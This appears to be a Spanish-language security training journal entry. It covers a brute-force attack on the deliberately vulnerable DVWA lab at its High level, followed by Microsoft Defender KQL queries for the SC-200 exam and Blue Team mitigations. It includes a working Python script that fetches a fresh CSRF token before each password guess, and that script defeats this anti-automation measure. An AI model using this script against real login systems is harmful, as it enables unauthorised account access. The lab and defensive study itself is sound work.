# Día 29 — Broken Authentication + KQL Filtering & Aggregation

**Fecha:** Mayo 2026  
**MITRE:** T1078.001  
**Target:** DVWA Brute Force (High) + Microsoft Defender XDR

---

## Teoría

### Broken Authentication

Broken Authentication es cuando una app tiene fallas en su sistema de autenticación que permiten a un atacante acceder a cuentas sin conocer las credenciales legítimas.

**La diferencia con IDOR (Día 28):**
- **IDOR** — el atacante ya está autenticado pero accede a recursos de otros
- **Broken Auth** — el atacante ni siquiera necesita autenticarse correctamente

**Vectores principales:**

**1. Brute Force** — probar miles de contraseñas hasta encontrar la correcta
```
admin:password123  → ❌
admin:letmein      → ❌
admin:password     → ✅
```

**2. Credential Stuffing** — usar combinaciones email/password filtradas de otros breaches y probarlas en otros sitios. Funciona porque la gente reutiliza passwords.

**3. Session Fixation** — forzar un session ID conocido al usuario antes de que se autentique, luego secuestrar la sesión.

**4. Weak Session Tokens** — tokens predecibles o sin expiración que pueden ser forjados.

**Casos reales:**
- **Yahoo (2013)** — 3 billones de cuentas comprometidas por cookies de sesión forjadas
- **Zoom (2020)** — credential stuffing masivo, 500K cuentas vendidas en dark web
- **Uber (2022)** — MFA fatigue attack, atacante mandó 100+ requests de MFA hasta que el empleado aceptó uno

---

## Red Team

### Sección 1 — Entendiendo las protecciones por nivel

DVWA tiene tres niveles de protección para Brute Force:

| Nivel | Protección | Herramienta |
|-------|-----------|-------------|
| Low | Sin protección | Hydra directo |
| Medium | `sleep(2)` entre intentos | Hydra (más lento) |
| High | CSRF token que cambia cada request + sleep aleatorio | Script Python custom |

El nivel High es el único que requiere extracción dinámica de tokens — Hydra no sabe hacerlo.

### Sección 2 — Conceptos clave: Cookie vs CSRF Token

**Cookie (PHPSESSID):**
- Viaja en el header HTTP
- El navegador la manda automáticamente en cada request
- Identifica la sesión en el servidor
- El servidor guarda el estado asociado a ese ID

**CSRF Token (user_token):**
- Vive embebido en el HTML de la página
- Hay que leerlo manualmente y mandarlo en cada request
- Es de un solo uso — el servidor genera uno nuevo en cada GET
- Protege contra ataques automatizados porque obliga a leer la respuesta anterior

**¿Cómo autentica el servidor?**
La cookie no cambia con el login — lo que cambia es el estado en el servidor:
```
GET /login.php
  → Servidor crea: PHPSESSID=abc123 → estado: "no autenticado"

POST /login.php (credenciales + CSRF token válido)
  → Servidor actualiza: PHPSESSID=abc123 → estado: "autenticado como admin"
```

### Sección 3 — Login a DVWA nivel High

El login de DVWA también está protegido con CSRF token. El flujo correcto es:

```bash
# Paso 1: GET al login para obtener cookie + CSRF token
LOGIN_PAGE=$(curl -s -c /tmp/dvwa_cookies.txt "http://192.168.1.96:8080/login.php")
LOGIN_TOKEN=$(echo "$LOGIN_PAGE" | grep -oP "user_token' value='\K[^']+")
COOKIE=$(grep PHPSESSID /tmp/dvwa_cookies.txt | awk '{print $NF}')

# Paso 2: POST con credenciales + token
curl -s -b "PHPSESSID=$COOKIE" \
  -d "username=admin&password=password&Login=Login&user_token=$LOGIN_TOKEN" \
  "http://192.168.1.96:8080/login.php" -o /dev/null
```

**Configurar nivel High via security.php** (también requiere su propio CSRF token):

```bash
sec_page=$(curl -s -b "PHPSESSID=$COOKIE" "http://192.168.1.96:8080/security.php")
sec_token=$(echo "$sec_page" | grep -oP "user_token' value='\K[^']+")
curl -s -b "PHPSESSID=$COOKIE" \
  -d "security=high&seclev_submit=Submit&user_token=$sec_token" \
  "http://192.168.1.96:8080/security.php" -o /dev/null
```

### Sección 4 — Brute Force High con script Python

Hydra no puede manejar CSRF tokens dinámicos — necesita un script custom que:
1. Haga GET para obtener token fresco
2. Mande el intento de password con ese token
3. Repita para cada password de la lista

```python
import requests
import re
import sys

TARGET = "http://192.168.1.96:8080"
S = requests.Session()

# Login
p = S.get(f"{TARGET}/login.php")
t = re.search(r"user_token.*?value='([^']+)'", p.text).group(1)
S.post(f"{TARGET}/login.php", data={
    "username": "admin", "password": "password",
    "Login": "Login", "user_token": t
})

# Configurar High
sec_page = S.get(f"{TARGET}/security.php")
sec_token = re.search(r"user_token.*?value='([^']+)'", sec_page.text).group(1)
S.post(f"{TARGET}/security.php", data={
    "security": "high", "seclev_submit": "Submit", "user_token": sec_token
})

# Brute force con token dinámico
passwords = ["123456", "password", "letmein", "admin", "welcome",
             "monkey", "dragon", "master", "qwerty", "login",
             "abc123", "admin123", "password123", "iloveyou", "trustno1"]

print(f"Brute force contra 'admin' — {len(passwords)} passwords — nivel HIGH")
print("-" * 55)

for pwd in passwords:
    # GET para token fresco — obligatorio en nivel High
    page = S.get(f"{TARGET}/vulnerabilities/brute/")
    token = re.search(r"user_token.*?value='([^']+)'", page.text)
    if not token:
        print(f"[!] Token no encontrado, skip")
        continue
    token = token.group(1)

    resp = S.get(f"{TARGET}/vulnerabilities/brute/", params={
        "username": "admin", "password": pwd,
        "Login": "Login", "user_token": token
    })

    if "Welcome to the password protected area" in resp.text:
        print(f"[+] PASSWORD ENCONTRADO: admin:{pwd}")
        sys.exit(0)
    else:
        print(f"[-] Fallido: {pwd}")
```

**Output:**
```
Brute force contra 'admin' — 15 passwords — nivel HIGH
-------------------------------------------------------
[-] Fallido: 123456
[+] PASSWORD ENCONTRADO: admin:password
```

**BRUTE FORCE HIGH COMPLETADO** ✅

**¿Por qué el nivel High no es suficiente protección?**
El CSRF token obliga a 2 requests por intento en lugar de 1 — duplica el tiempo pero no lo hace imposible. Para protección real se necesita:
- Account lockout después de N intentos fallidos
- Rate limiting por IP
- CAPTCHA después de fallos consecutivos
- MFA — aunque adivines el password, necesitas el segundo factor

---

## SC-200 — KQL: Filtering & Aggregation

### Query 1 — Filtrado con `contains` y `ago()`

```kql
AlertInfo
| where Timestamp > ago(30d)
| where Title contains "malware" or Title contains "suspicious"
| project Timestamp, Title, Severity, Category
| sort by Timestamp desc
```

**Resultado: 46 alertas** en los últimos 30 días con "malware" o "suspicious" en el título.

Alertas relevantes encontradas:
```
[Test Alert] Suspicious PowerShell     Informational  Execution
An active 'UACBypass' malware          Low            Malware
An active 'Powessere' malware          Low            Malware
An active 'Powernet' malware           Low            Malware
New group added suspicious             Medium         Persistence
```

**Operadores nuevos:**
- `ago(30d)` — función de tiempo. También acepta `h` (horas), `m` (minutos), `s` (segundos)
- `contains` — busca texto parcial, case-insensitive. Diferente a `==` que requiere match exacto

### Query 2 — Aggregation con `countif()` y `bin()`

```kql
AlertInfo
| where Timestamp > ago(30d)
| summarize
    TotalAlertas = count(),
    Criticas = countif(Severity == "High"),
    Medias = countif(Severity == "Medium")
  by bin(Timestamp, 1d)
| sort by Timestamp desc
```

Las columnas `TotalAlertas`, `Criticas` y `Medias` no existen en la tabla — las creamos nosotros con `summarize`. Es equivalente a una tabla dinámica en Excel.

**Resultado — alertas por día:**
```
7 may 2026  → TotalAlertas: 1904  Críticas: 1123  Medias: 781
3 may 2026  → TotalAlertas: 776   Críticas: 436   Medias: 327
26 abr 2026 → TotalAlertas: 19    Críticas: 1     Medias: 3
24 abr 2026 → TotalAlertas: 3     Críticas: 1     Medias: 1
2 may 2026  → TotalAlertas: 2     Críticas: 0     Medias: 0
```

El 7 de mayo tiene 1904 alertas — un pico masivo que en un SOC real dispararía investigación inmediata.

**Operadores nuevos:**
- `countif(condición)` — cuenta solo las filas que cumplen la condición
- `bin(Timestamp, 1d)` — agrupa timestamps en cubos de 1 día

### Query 3 — Join entre tablas

```kql
AlertInfo
| where Timestamp > ago(30d)
| join kind=inner AlertEvidence on AlertId
| where EntityType == "Machine"
| summarize TotalAlertas = count() by DeviceName
| sort by TotalAlertas desc
| take 10
```

**Resultado — top dispositivos por alertas:**
```
usuario1          100 alertas  ← dispositivo del incidente Día 27
pcfabian           79 alertas
pruebadefender1    42 alertas
equipo-4           41 alertas
mvforsentinel34f   34 alertas
```

`usuario1` con 100 alertas confirma la correlación con el incidente de hands-on keyboard attack analizado en el Día 27.

**Cómo funciona `join`:**
```
AlertInfo              AlertEvidence
AlertId: abc    +      AlertId: abc      →  fila combinada
Title: "XXX"           DeviceName: "usuario1"   con todos los datos
```

`kind=inner` significa que solo devuelve filas que existen en AMBAS tablas — si una alerta no tiene evidencia asociada, no aparece en el resultado.

### Resumen de operadores KQL — acumulado 10 días

| Operador | Equivalente SQL | Qué hace |
|----------|----------------|----------|
| `take` | LIMIT | Limita número de filas |
| `where` | WHERE | Filtra filas por condición |
| `project` | SELECT col1, col2 | Selecciona columnas |
| `sort by` | ORDER BY | Ordena resultados |
| `summarize count() by` | GROUP BY + COUNT | Agrupa y cuenta |
| `ago(30d)` | NOW() - INTERVAL | Función de tiempo |
| `contains` | LIKE '%texto%' | Busca texto parcial |
| `countif()` | COUNT(CASE WHEN) | Cuenta con condición |
| `bin(Timestamp, 1d)` | DATE_TRUNC | Agrupa por intervalo |
| `join kind=inner` | INNER JOIN | Combina dos tablas |

---

## Blue Team

### Detección Broken Authentication
- **Wazuh / SIEM** — reglas para detectar múltiples intentos de login fallidos desde la misma IP en corto tiempo
- **KQL en Defender** — `IdentityLogonEvents` para buscar patrones de brute force
- **Alertas de CredentialAccess** — el tenant ya tiene 2 alertas de esta categoría detectadas automáticamente

### Mitigación Broken Authentication
- **Account lockout** — bloquear cuenta después de 5-10 intentos fallidos
- **Rate limiting** — máximo N intentos por IP por minuto
- **MFA** — el factor más efectivo, el password ya no es suficiente
- **CAPTCHA** — obliga verificación humana después de fallos consecutivos
- **Passwords robustos** — `password` como credencial de admin es inaceptable en producción
- **Monitoreo de logins** — alertar en logins desde IPs o ubicaciones inusuales

---

## Conclusión

Broken Authentication demostró que bypassear protecciones anti-brute-force es cuestión de entender el mecanismo de defensa. El CSRF token del nivel High obligó a obtener un token fresco antes de cada intento — algo que Hydra no puede hacer pero un script Python custom sí. La distinción entre cookie de sesión (identifica la sesión) y CSRF token (protege formularios) quedó clara en la práctica.

En KQL se ejecutaron 3 queries avanzadas: filtrado con `contains` y `ago()`, aggregation con `countif()` y `bin()` para alertas por día, y un `join` entre `AlertInfo` y `AlertEvidence` para identificar los dispositivos más ruidosos del tenant. El acumulado de 10 operadores KQL cubre el 80% de las queries del examen SC-200.
